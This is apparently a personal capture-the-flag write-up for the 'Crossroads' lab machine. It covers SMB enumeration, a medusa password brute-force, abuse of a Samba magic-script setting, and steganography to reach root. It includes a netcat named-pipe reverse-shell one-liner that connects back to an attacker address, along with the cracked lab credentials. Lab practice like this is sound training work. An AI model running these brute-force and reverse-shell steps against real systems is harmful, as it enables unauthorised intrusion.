# Crossroad (Creatigon Basic Pentest)

---

- crossroad is Eric Clapton's song which is one of my favorite. Does this title come from this?

## Enumeration

- Nmap Initial

```
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: CROSSROADS
```

- http and samba
- Let explore

### http

- /robots.txt -> crossroads.png
- directory fuzzing -> nothing special found
- get the crossroads.png file

### samba

```sh
smbmap -H $IP
```

- found 3 directories with no access

```sh
$ enum4linux $IP
CROSSROADS\nobody (Local User)
CROSSROADS\None (Domain Group)
CROSSROADS\albert (Local User)
```

- user albert found and brute force password

```sh
$ medusa -h $IP -u albert -P rockyou.txt -M smbnt
# User: albert Password: bradley1
```

- check smbmap with albert user

```sh
└─$ smbmap -u albert -p 'bradley1' -H $IP
[+] IP: 10.0.2.17:445   Name: 10.0.2.17
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        smbshare                                                READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
        albert                                                  READ ONLY       Home Directories
```

- enter smb share with albert user with password bardley1
- found 4 files
  - beroot -> exeuctable file
  - crossroads.png -> image file
  - smb.conf -> smbconfiguration file
  - user.txt -> flag for ctf
- images get from web and smb has different file sizes, former is 1.1 Mb and later 1.6 Mb and something may be hidden inside image
- TODO -> check the crossroads.png file

- In smb.conf,

```
[smbshare]

path = /home/albert/smbshare
valid users = albert
browsable = yes
writable = yes
read only = no
magic script = smbscript.sh
guest ok = no
```

- magic script is running with name `smbscript.sh`
- create smbscript.sh with nc reverse shell and put it inside smb share for albert to get reverse shell
- listen with nc at the attacker machine and write
- smbscript.sh

```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $UR_IP $PORT >/tmp/f
```

- enter smb share at smbshare folder with user albert and put smbscript.sh
- (Note - enter only at /smbshare, if not, the payload can't be uploaded)
- get linpeas.sh file and run it.
- nothing special found except

```
-rwsr-xr-x 1 root root 17K Mar  2  2021 /home/albert/beroot (Unknown SUID binary!)
```

- beroot binary which is downloaded before
- check this binary

```sh
albert@crossroads:/home/albert$ ./beroot
./beroot
TERM environment variable not set.
enter password for root
-----------------------

abc
wrong password!!!
```

- inside own terminal

```
$ ./beroot
/bin/bash: /root/beroot.sh: Permission denied
```

- need to find password

```sh
$ stegoveritas crossroads.png
```

- found two text files inside results/keepers
- remove null bytes from one text file and use as pwds.txt
- use that words as passwords
- copy the pwds.txt file into albert's shell

```sh
for pwd in $(cat pwds.txt); do echo $pwd | ./beroot; done
```

- then rootcreds file appears and cat rootcreds will give the password for root
- enter root with that password `su root`.

---
